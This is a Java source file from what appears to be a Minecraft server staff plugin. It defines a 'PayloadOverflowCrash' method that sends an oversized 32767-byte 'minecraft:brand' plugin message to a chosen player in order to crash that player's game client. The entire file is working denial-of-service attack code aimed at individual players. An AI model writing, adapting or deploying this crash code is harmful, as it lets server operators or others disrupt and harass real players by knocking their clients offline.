package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPluginMessage;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import org.bukkit.entity.Player;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class PayloadOverflowCrash extends Crash {
    public PayloadOverflowCrash() {
        super(CrashMethod.PAYLOAD_OVERFLOW);
    }

    @Override
    public void performCrash(Player player) {
        byte[] largePayload = new byte[Short.MAX_VALUE];
        Arrays.fill(largePayload, (byte) 'A');

        WrapperPlayServerPluginMessage packet = new WrapperPlayServerPluginMessage(
                "minecraft:brand",
                largePayload
        );
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
